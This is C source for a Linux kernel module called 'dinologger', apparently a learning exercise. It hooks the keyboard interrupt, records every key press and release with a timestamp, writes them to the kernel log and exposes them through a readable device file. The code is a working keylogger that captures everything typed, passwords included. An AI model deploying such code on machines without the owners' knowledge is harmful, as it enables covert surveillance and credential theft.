#include "dinologger.h"

unsigned char *kbus[] = {US_KBMAP};
unsigned int stats[97] = {0};

char *device_file[BUFFER_SIZE];
int device_size = 0;
int device_index = 0;

struct miscdevice misc;
int misc_open = 0;
static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = device_read,
	.open = device_open,
	.release = device_release,
};

/* === UTILS === */

static char *strdup(char const *str) {
	int len = strlen(str);
	char *result = kmalloc((len + 1) * sizeof(char), GFP_KERNEL);
	if (!result)
		return NULL;
	for (int i = 0; i < len; i++) {
		result[i] = str[i];
	}
	result[len] = '\0';
	return result;
}

/* === MISCDEVICE === */

static int device_open(struct inode *inode, struct file *file) {
	if (misc_open)
		return -EBUSY;
	misc_open++;
	return 0;
}

static int device_release(struct inode *inode, struct file *file) {
	misc_open--;
	return 0;
}

static ssize_t device_read(struct file *filep, char *u_buffer, size_t len, loff_t *offset) {
	if (*offset >= device_size)
		return 0;
	if (*offset + len > device_size)
		len = device_size - *offset;

	int i = 0;
	int j = 0;
	int total = 0;
	int bytes = 0;

	// reach the offset
	while (i < device_index) {
		int len_str = strlen(device_file[i]) + 1;
		if (total + len_str >= *offset) {
			j = *offset - total;
			break;
		}
		total += len_str;
		i++;
	}

	// write everything in the user buffer
	while (i < device_index && len > 0) {
		while (device_file[i][j] && len > 0) {
			if (put_user(device_file[i][j], u_buffer++))
				return -EFAULT;
			j++;
			bytes++;
			len--;
		}

		if (len > 0) {
			if (put_user('\n', u_buffer++))
				return -EFAULT;
			len--;
			bytes++;
		}

		j = 0;
		i++;
	}

	*offset += bytes;
	return bytes;
}

static int register_device(void) {
	misc.minor = MISC_DYNAMIC_MINOR;
	misc.name = DEVICE_NAME;
	misc.fops = &fops;

	int res = misc_register(&misc);
	if (res < 0) {
		LOG("failed to register - error code: %d", res);
		return res;
	}
	LOG("registered device");
	return 0;
}

static void unregister_device(void) {
	LOG("unregistering");
	misc_deregister(&misc);
}

/* === KEY HANDLER === */

static void add_log_to_file(char *str) {
	if (device_index < BUFFER_SIZE - 1) {
		device_file[device_index] = str;
		device_index++;
	} else {
		kfree(device_file[0]);
		for (int i = 0; i < device_index; i++) {
			device_file[i] = device_file[i + 1];
		}
		device_file[device_index] = str;
	}
}

static void add_entry(int scancode, int release, struct rtc_time *time) {
	char entry[42];
	int len = scnprintf(entry, 42,
			"[%ptRt] %s (%d) %s",
			time, NAME(scancode), scancode, STATE(release));

	if (len <= 0)
		return ;
	char *log = strdup(entry);
	if (log) {
		add_log_to_file(log);
		device_size += len;
	}

	LOG("%s", entry);
	if (!release)
		STAT(scancode);
}

static irqreturn_t irq_handler(int irq, void *dev_id) {
	int scancode = inb(0x60);
	int release = scancode & RELEASE;
	scancode &= CANCEL_RELEASE;

	struct rtc_time time = rtc_ktime_to_tm(ktime_get_real());
	WINTER_TIME(time);

	add_entry(scancode, release, &time);
	return IRQ_NONE;
}

/* === INIT/EXIT === */

int __init m_init(void) {
	LOG("trying to init");
	int err = 0;

	err = register_device();
	if (err)
		return err;
	err = request_irq(1, irq_handler, IRQF_SHARED, "kb", (void *)irq_handler);
	if (err) {
		LOG("request_irq failed");
		return err;
	}
	return 0;
}

void __exit m_exit(void) {
	unregister_device();

	int max = 0;
	int sum = 0;
	for (int i = 0; i < 97; i++) {
		if (MAPPED(i)) {
			if (stats[i] > stats[max])
				max = i;
			sum += stats[i];
		}
	}
	if (sum > 0) {
		int ratio = (stats[max]*100)/sum;
		LOG("you pressed %d keys", sum);
		LOG("most pressed key is '%s': %d times (%d%%) !", kbus[max], stats[max], ratio);
	} else {
		LOG("you pressed no keys :(");
	}

	free_irq(1, (void *)irq_handler);
	for (int i = 0; i < device_index; i++) {
		kfree(device_file[i]);
	}
	return;
}

MODULE_LICENSE ("GPL");
MODULE_AUTHOR("DinoMalin");

module_init(m_init);
module_exit(m_exit);
